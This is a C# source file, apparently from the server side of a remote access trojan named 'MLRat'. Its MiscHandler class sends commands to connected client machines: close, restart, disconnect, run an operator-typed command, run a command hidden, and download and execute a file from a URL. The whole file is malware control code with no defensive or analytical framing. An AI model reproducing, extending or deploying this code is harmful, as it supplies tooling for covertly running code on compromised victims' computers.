using MLManagementServer.Forms;
using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLManagementServer.Handlers
{
    public static class MiscHandler
    {
        public static void CloseContextHandler(IClient[] clients)
        {
            foreach (IClient c in clients)
                c.Send((byte)NetworkCommand.Close);
        }

        public static void RestartContextHandler(IClient[] clients)
        {
            foreach (IClient c in clients)
                c.Send((byte)NetworkCommand.Restart);
        }

        public static void DisconnectHandler(IClient[] clients)
        {
            foreach (IClient c in clients)
                c.Disconnect();
        }

        public static void ExecuteContextHandler(IClient[] clients)
        {
            if (clients.Length < 1)
                return;
            string execute = string.Empty;
            using (formInput input = new formInput("Execute"))
            {
                if (input.ShowDialog() != System.Windows.Forms.DialogResult.OK)
                    return;
                execute = input.InputText;
            }
            foreach (IClient c in clients)
                c.Send((byte)NetworkCommand.Execute, execute);
        }


        public static void ExecuteHiddenContextHandler(IClient[] clients)
        {
            if (clients.Length < 1)
                return;
            string execute = string.Empty;
            using (formInput input = new formInput("Execute"))
            {
                if (input.ShowDialog() != System.Windows.Forms.DialogResult.OK)
                    return;
                execute = input.InputText;
            }
            foreach (IClient c in clients)
                c.Send((byte)NetworkCommand.ExecuteHidden, execute);
        }

        public static void DownloadAndExecuteContextHandler(IClient[] clients)
        {
            if (clients.Length < 1)
                return;
            string execute = string.Empty;
            using (formInput input = new formInput("Execute URL"))
            {
                if (input.ShowDialog() != System.Windows.Forms.DialogResult.OK)
                    return;
                execute = input.InputText;
            }
            foreach (IClient c in clients)
                c.Send((byte)NetworkCommand.DownloadAndExecute, execute);
        }
    }
}
